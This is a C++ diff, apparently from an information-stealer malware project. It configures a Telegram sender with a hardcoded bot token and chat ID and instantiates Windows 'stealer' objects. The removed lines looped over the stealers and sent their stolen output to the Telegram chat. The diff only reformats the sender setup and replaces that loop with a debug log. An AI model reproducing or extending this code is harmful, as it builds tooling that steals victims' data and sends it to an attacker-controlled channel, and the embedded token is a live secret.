@@ -4,7 +4,11 @@
 
 #include <filesystem>
 #include <fstream>
+#include <queue>
 #include <syncstream>
+#include <functional>
+
+#include <boost/cobalt.hpp>
 
 #include "senders/sender.h"
 #include "senders/telegram_sender.h"
@@ -107,25 +111,19 @@ asio::awaitable<void> co_main()
 {
     auto io_context = co_await asio::this_coro::executor;
 
-    std::unique_ptr<sender_t> sender{ new telegram_sender_t{
-        "6920020229:AAFsRJR5WUZcWk5StJxYdZPTQdBXB6vvLt0",
-        "515352778"
-    } } ;
+    std::unique_ptr<sender_t> sender{
+        new telegram_sender_t{
+            "6920020229:AAFsRJR5WUZcWk5StJxYdZPTQdBXB6vvLt0",
+            "515352778"
+        }
+    };
 
     std::vector<std::unique_ptr<base_stealer_t>> stealers;
     stealers.emplace_back(std::make_unique<win_stealer_t>());
     stealers.emplace_back(std::make_unique<win_stealer_t>());
 
-    std::vector<std::future<std::string>> results;
-    for (auto& stealer : stealers)
-    {
-        results.emplace_back(stealer->steal());
-    }
+    DLOG("DONE");
 
-    for (auto& future : results)
-    {
-        const auto result = co_await sender->send_message(future.get());
-    }
 }
 
 int main()
